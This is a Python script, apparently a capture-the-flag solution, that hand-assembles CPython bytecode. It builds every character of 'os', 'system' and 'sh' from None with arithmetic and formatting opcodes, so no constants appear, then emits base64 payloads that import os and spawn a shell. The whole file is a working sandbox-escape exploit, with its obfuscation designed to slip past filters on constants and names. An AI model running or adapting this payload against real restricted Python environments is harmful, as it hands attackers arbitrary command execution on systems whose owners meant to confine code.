from base64 import b64encode
import dis

def BUILD_ZERO():
    return [
        ('LOAD_CONST', 0), # None
        'UNARY_NOT',
        'UNARY_NOT', # False
        'DUP_TOP',
        'BINARY_MULTIPLY' # False * False = 0
    ]

def BUILD_NUMBER(n):
    if n == 0:
        return BUILD_ZERO()

    ins = [
        ('LOAD_CONST', 0), # None
        'UNARY_NOT', # True
        'DUP_TOP',
        'BINARY_MULTIPLY', # True * True = 1
    ]
    
    diff = n - 1
    ins += ['DUP_TOP'] * diff
    ins += ['BINARY_ADD'] * diff

    return ins

def BUILD_LETTER(ch):
    return [
        *BUILD_NUMBER(ord(ch)),

        *BUILD_NUMBER(1),
        *BUILD_NUMBER(1),
        ('BUILD_SLICE', 2),
        'FORMAT_VALUE', # 'slice(1, 1, None)'
        *BUILD_NUMBER(3),
        'BINARY_SUBSCR', # 'c'

        ('FORMAT_VALUE', 4) # format(n, 'c') is the same as chr(n)
    ]

def BUILD_STRING(s):
    ins = []
    for ch in s:
        ins += BUILD_LETTER(ch)
    ins += [('BUILD_STRING', len(s))]
    return ins

def assemble(instructions):
    bytecode = b''
    for instr in instructions:
        if type(instr) == str:
            instr = (instr,)
        if len(instr) == 2:
            opcode = dis.opmap[instr[0]]
            arg = instr[1]
        elif len(instr) == 1:
            opcode = dis.opmap[instr[0]]
            arg = 0

        bytecode += bytes([opcode, arg])

    return bytecode

names = assemble([
    *BUILD_STRING('os'),
    *BUILD_STRING('system'),
    ('BUILD_TUPLE', 2),
    'RETURN_VALUE'
])

code = assemble([
    *BUILD_NUMBER(0),
    ('BUILD_LIST', 0),
    ('IMPORT_NAME', 0),
    ('LOAD_METHOD', 1),
    *BUILD_STRING('sh'),
    ('CALL_METHOD', 1),
    'RETURN_VALUE'
])

print(b64encode(names))
print(b64encode(code))